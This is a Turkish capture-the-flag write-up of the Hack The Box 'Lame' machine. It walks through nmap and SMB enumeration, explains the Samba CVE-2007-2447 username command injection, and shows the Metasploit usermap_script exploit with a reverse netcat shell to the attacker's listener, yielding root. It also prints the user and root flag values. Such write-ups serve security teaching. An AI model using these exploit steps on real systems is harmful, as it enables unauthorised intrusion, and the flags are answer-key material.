<img width="1166" height="710" alt="1575942647604" src="https://github.com/user-attachments/assets/80eb637d-e1f1-4e3c-ac15-e680d51eb3e0" />

## About

Lame, Hack The Box'ta yayınlanan ilk makine ve uzun süre yeni başlayanların platforma giriş yaptığı ilk hedef oldu. İsmi "kolay" anlamına gelse de, root'a ulaşmak için tek bir exploit yeterli


## Keşif

Standart nmap taramasıyla başlıyorum:

```
nmap -sS -A -p- 10.129.50.11 -T5
```

<img width="868" height="775" alt="nmap" src="https://github.com/user-attachments/assets/b9980f78-8d07-4b17-9882-4552dc9c0080" />


Dört tane açık servis var ve hepsi potansiyel birer giriş kapısı: FTP, SSH, SMB ve distccd. Sırayla kontrol etmeye karar verdim.

### FTP

Anonymous login açık olduğu için içeri girdim, ama dizin bomboştu

### SMB

FTP boş çıkınca dikkatimi SMB'ye çevirdim. Anonim erişimle paylaşımları listeledim:

```
smbclient -L \\10.129.50.11 -N

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
```

`tmp` paylaşımına anonim olarak bağlanabildim ve içindeki dosyalara baktım. Bir log dosyasını (`vgauthsvclog.txt.0`) indirip inceledim, ama içeriği VMware Tools'a ait rutin bir servis logundan ibaretti.

Yine de SMB banner'ından çok değerli bir bilgi almıştım: **`Samba 3.0.20-Debian`**. Nmap çıktısı da bunu doğruluyordu. Bu spesifik versiyon numarası, bir sonraki adımım için bana net bir yön verdi.

<img width="858" height="761" alt="smb" src="https://github.com/user-attachments/assets/78666af6-5c77-48f2-a79f-0b91cf742366" />

<img width="853" height="563" alt="smb2" src="https://github.com/user-attachments/assets/e566a57a-2455-4360-b728-35bddb8ba171" />

## Zafiyet Araştırması

`Samba 3.0.20` sürümünü doğrudan searchsploit ile aratmaya karar verdim:

```
searchsploit "Samba 3.0.20"
```

<img width="860" height="197" alt="2" src="https://github.com/user-attachments/assets/7f222e7e-20a2-44e4-8ce7-ec0b3283c6c1" />

İkinci satır tam olarak elimdeki versiyon aralığına (`3.0.20 < 3.0.25rc3`) uyuyordu: **"username map script" Command Execution**. Bu, CVE-2007-2447 olarak bilinen ve Samba'nın `smb.conf` dosyasındaki `username map script` özelliğinin kötüye kullanılmasına dayanan, oldukça ünlü bir uzaktan kod çalıştırma zafiyeti.

---

## Zafiyet Nedir? (CVE-2007-2447)

Kısaca özetlemek gerekirse: Samba'nın SMB/CIFS implementasyonunda, kullanıcı adı eşleştirme (`username map script`) özelliği etkinleştirildiğinde, sunucu istemciden gelen kullanıcı adı bilgisini bir shell komutuna doğrudan parametre olarak geçiriyor. Sorun şu ki bu kullanıcı adı **hiçbir şekilde sanitize edilmiyor**.

Bu da saldırgana şu imkanı veriyor: SMB login isteği sırasında "kullanıcı adı" alanına normal bir kullanıcı adı yerine, shell metakarakterleri (`;`, `` ` ``, `$()` gibi) içeren bir komut enjekte edebiliyor. Sunucu bu veriyi işlerken, aslında farkında olmadan saldırganın gömdüğü komutu da çalıştırıyor. Sonuç: **kimlik doğrulama bile gerekmeden, doğrudan uzaktan kod çalıştırma (RCE)**.

**Etkilenen sürümler:** Samba 3.0.20 ile 3.0.25rc3 arası (yalnızca `username map script` seçeneği `smb.conf` içinde aktif edilmişse istismar edilebilir — ki bu özellik o dönemde bazı dağıtımlarda varsayılan olarak açık geliyordu).

Bu açığın popüler olmasının bir diğer sebebi de exploit için hiçbir ön koşulun (geçerli kullanıcı adı/şifre, özel bir yapılandırma bilgisi vs.) gerekmemesi — sadece SMB portuna erişim yeterli.

---

## Exploitation

Metasploit'te ilgili modülü aradım:

```
msf > search samba 3.0.20
```

```
Matching Modules
================

   #  Full Name                           Disclosure Date  Rank       Check  Name
   -  ---------                           ---------------  ----       -----  ----
   0  exploit/multi/samba/usermap_script  2007-05-14        excellent  No     Samba "username map script" Command Execution
```

Modülü seçtim ve gerekli ayarları yaptım:

```
msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > show options
```

```
Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address
   LPORT  4444             yes       The listen port
```

```
set RHOSTS 10.129.50.11
set LHOST 10.10.14.187
```

Ve çalıştırdım:

```
msf exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 10.10.14.187:4444
[*] Command shell session 1 opened (10.10.14.187:4444 -> 10.129.50.11:46555) at 2026-08-29 18:01:21 -0400
```

Shell direkt açıldı.

```
whoami
root
```

<img width="853" height="609" alt="msfconsole" src="https://github.com/user-attachments/assets/ad49680a-7245-41d8-9dbf-a142e3fd52b7" />

Herhangi bir privilege escalation adımına gerek kalmadan, exploit tek başına doğrudan **root** yetkisi verdi. Bunun sebebi, o dönemde Samba servisinin genellikle root yetkisiyle çalıştırılması

## Flag'ler

Root shell'i aldıktan sonra dosya sistemine göz gezdirdim.

Önce normal kullanıcı klasörlerine baktım:

```
cd makis
ls
user.txt
cat user.txt
a03aefcc69b41f44e8d2d7ff47a908ac
```

**User flag** elde edildi.

Zaten root olduğum için doğrudan `/root` dizinine geçtim:

```
cd /root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
ad6b459f52fee75d1a23b88bf2df309c

```

**Root flag** de böylece elimizdeydi.

<img width="388" height="211" alt="flags" src="https://github.com/user-attachments/assets/6c0aae14-3582-4f21-ae72-8fe6242feccf" />
